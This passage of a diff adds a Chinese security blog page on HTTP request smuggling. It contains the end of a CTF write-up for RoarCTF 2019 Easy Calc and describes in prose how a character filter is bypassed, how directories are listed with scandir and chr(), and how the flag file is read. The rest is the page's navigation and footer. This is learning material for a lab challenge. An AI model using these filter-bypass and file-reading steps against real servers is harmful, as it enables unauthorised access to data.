class="variable">$str</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+<p>但是随便输入一点数据之后，发现不只是这些字符被过滤了，字母也被过滤了<br>这里就可以用http请求走私漏洞，让页面收到两个请求,任意类型的都可以，只要让页面报错就可以<br><img src="https://pic1.imgdb.cn/item/67dc324088c538a9b5c218c0.png"><br>下一步就是找到disable_functions 可以看到禁了很多函数，但是php还是有很多函数可以用可以先用scandir看当前目录的文件<br>因为过滤了&#x2F; 所以用chr转一下<br><img src="https://pic1.imgdb.cn/item/67dc344688c538a9b5c21917.png"><br>最后用file_get_contents或者show_source函数看flag</p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>guayu-kakeru
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://guayu-kakeru.github.io/posts/51504.html" title="HTTP请求走私漏洞学习">https://guayu-kakeru.github.io/posts/51504.html</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/web/" rel="tag"># web</a>
+              <a href="/tags/%E7%AC%94%E8%AE%B0/" rel="tag"># 笔记</a>
+              <a href="/tags/%E6%BC%8F%E6%B4%9E/" rel="tag"># 漏洞</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/posts/57863.html" rel="prev" title="HMV-Driftingblues3">
+      <i class="fa fa-chevron-left"></i> HMV-Driftingblues3
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFhttp%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81"><span class="nav-text">什么是http请求走私</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%A6%82%E4%BD%95%E5%87%BA%E7%8E%B0%E7%9A%84"><span class="nav-text">http请求走私如何出现的</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E6%89%A7%E8%A1%8Chttp%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81"><span class="nav-text">如何执行http请求走私</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#CL-CL"><span class="nav-text">CL.CL</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CL-TE"><span class="nav-text">CL.TE</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#TE-CL"><span class="nav-text">TE.CL</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#TE-TE"><span class="nav-text">TE.TE</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E8%AF%86%E5%88%AB"><span class="nav-text">如何识别</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E8%AE%A1%E6%97%B6%E6%8A%80%E6%9C%AF%E6%9F%A5%E6%89%BE-HTTP-%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E6%BC%8F%E6%B4%9E"><span class="nav-text">使用计时技术查找 HTTP 请求走私漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#CL-TE-1"><span class="nav-text">CL.TE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#TE-CL-1"><span class="nav-text">TE.CL</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E5%B7%AE%E5%88%86%E5%93%8D%E5%BA%94%E7%A1%AE%E8%AE%A4-HTTP-%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E6%BC%8F%E6%B4%9E"><span class="nav-text">使用差分响应确认 HTTP 请求走私漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#CL-TE-2"><span class="nav-text">CL.TE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#TE-CL-2"><span class="nav-text">TE.CL</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E"><span class="nav-text">利用漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8%E6%8E%A7%E5%88%B6"><span class="nav-text">绕过前端安全控制</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%98%BE%E7%A4%BA%E5%89%8D%E7%AB%AF%E8%AF%B7%E6%B1%82%E9%87%8D%E5%86%99"><span class="nav-text">显示前端请求重写</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81"><span class="nav-text">绕过客户端身份验证</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8D%95%E8%8E%B7%E5%85%B6%E4%BB%96%E7%94%A8%E6%88%B7%E7%9A%84%E8%AF%B7%E6%B1%82"><span class="nav-text">捕获其他用户的请求</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%8F%8D%E5%B0%84%E5%9E%8BXSS"><span class="nav-text">利用反射型XSS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B0%86%E7%8E%B0%E5%9C%BA%E9%87%8D%E5%AE%9A%E5%90%91%E8%BD%AC%E6%8D%A2%E4%B8%BA%E5%BC%80%E6%94%BE%E9%87%8D%E5%AE%9A%E5%90%91"><span class="nav-text">将现场重定向转换为开放重定向</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8-HTTP-%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E6%89%A7%E8%A1%8C-Web-%E7%BC%93%E5%AD%98%E4%B8%AD%E6%AF%92"><span class="nav-text">使用 HTTP 请求走私执行 Web 缓存中毒</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8-HTTP-%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E6%89%A7%E8%A1%8C-Web-%E7%BC%93%E5%AD%98%E6%AC%BA%E9%AA%97"><span class="nav-text">使用 HTTP 请求走私执行 Web 缓存欺骗</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98"><span class="nav-text">例题</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#RoarCTF-2019-Easy-Calc"><span class="nav-text">[RoarCTF 2019]Easy Calc</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="guayu-kakeru"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">guayu-kakeru</p>
+  <div class="site-description" itemprop="description">一年过后，你会希望从今天就开始行动。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">66</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/guayu-kakeru" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;guayu-kakeru" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/1806449041@qq.com" title="E-Mail → 1806449041@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+  <div class="links-of-recent-posts motion-element">
+    <div class="links-of-recent-posts-title">
+      <i class="fa fa-history fa-fw"></i>
+      最近文章
+    </div>
+    <ul class="links-of-recent-posts-list">
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/51504.html" title="posts&#x2F;51504.html">HTTP请求走私漏洞学习</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/57863.html" title="posts&#x2F;57863.html">HMV-Driftingblues3</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/53614.html" title="posts&#x2F;53614.html">flask框架&&ssti学习笔记</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/29573.html" title="posts&#x2F;29573.html">HMV-up</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/36666.html" title="posts&#x2F;36666.html">moectf_2024web</a>
+        </li>
+    </ul>
+  </div>
+      </div>
+
+      
+      
+        <div class="links-of-blogroll motion-element links-of-blogroll-undefined">
+          <div class="links-of-blogroll-title">
+            <i class="fa fa-history fa-" aria-hidden="true"></i>
+            
+          </div>
+          <ul class="links-of-blogroll-list">
+            
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+          </ul>
+        </div>
+      
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">guayu-kakeru</span>
+</div>
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
